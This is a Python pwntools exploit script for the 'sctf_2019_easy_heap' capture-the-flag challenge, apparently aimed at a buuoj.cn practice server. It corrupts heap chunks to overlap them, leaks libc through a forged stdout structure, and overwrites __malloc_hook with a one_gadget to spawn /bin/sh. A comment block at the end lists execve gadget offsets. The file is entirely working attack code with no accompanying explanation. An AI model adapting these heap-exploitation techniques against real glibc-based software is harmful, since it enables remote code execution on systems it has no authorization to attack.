#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'
'''
if(sys.argv[1] == 'l'):
	p = process('./sctf_2019_easy_heap')
	elf = ELF('./sctf_2019_easy_heap',checksec=False)
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

else:
	p = remote()
	elf = ELF('',checksec=False)
'''

def menu(cmd):
    sla('>> ',str(cmd))

def add(size):
    menu(1)
    sla('Size: ',str(size))
    #ru('Address ')
    #address = int(rv(14),16)

def delete(idx):
    menu(2)
    sla('Index: ',str(idx))

def fill(idx,content,en=1):
    menu(3)
    sla('Index: ',str(idx))
    if(en==0):
        sda('Content: ',content)
    else:
        sla('Content: ',content)

def pwn():
    ###chunk overlapping###
    add(0x410)#0
    add(0x68)#1
    add(0x4f0)#2
    add(0x60)#3

    delete(0)

    payload = 'A' * 0x60 + p64(0x420+0x70)
    fill(1,payload,0)

    delete(2)
    delete(1)

    ###leak libc###
    add(0x410)#0
    add(0x68+0x4f0)#1
    payload = '\x60' + '\x07'
    fill(1,payload,1)

    add(0x60)#3
    add(0x60)#4

    payload = p64(0xfbad1887) + p64(0) * 3 + '\0'
    fill(4,payload)

    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3ed8b0
    success('libc base:'+hex(libc_base))
    pause()

    ###fastbin attack###
    free_hook = libc_base + libc.symbols['__free_hook']
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    system = libc_base + libc.symbols['system']
    one_gadget = libc_base + 0x10a45c

    add(0x510)#5
    add(0x28)#6
    add(0x5f0)#7
    add(0x20)#8

    delete(5)

    payload = 'A' * 0x20 + p64(0x520 + 0x30)
    fill(6,payload)

    delete(7)
    delete(6)

    add(0x510+0x20)#5
    payload = 'A' * 0x510 + p64(0) + p64(0x30) + p64(malloc_hook)
    fill(5,payload)

    add(0x20)#6
    add(0x20)#7

    fill(7,p64(one_gadget))
    #fill(7,p64(system))
    #fill(1,'/bin/sh\x00')

    ###get shell###
    menu(1)
    sla('Size: ',str(0x210))

while(1):
    if(sys.argv[1] == 'l'):
        p = process('./sctf_2019_easy_heap')
        elf = ELF('./sctf_2019_easy_heap',checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

    else:
        p = remote('node3.buuoj.cn',28225)
        elf = ELF('./sctf_2019_easy_heap',checksec=False)
        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    
    try:
        pwn()
        ia()
    except:
        p.close()
'''
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''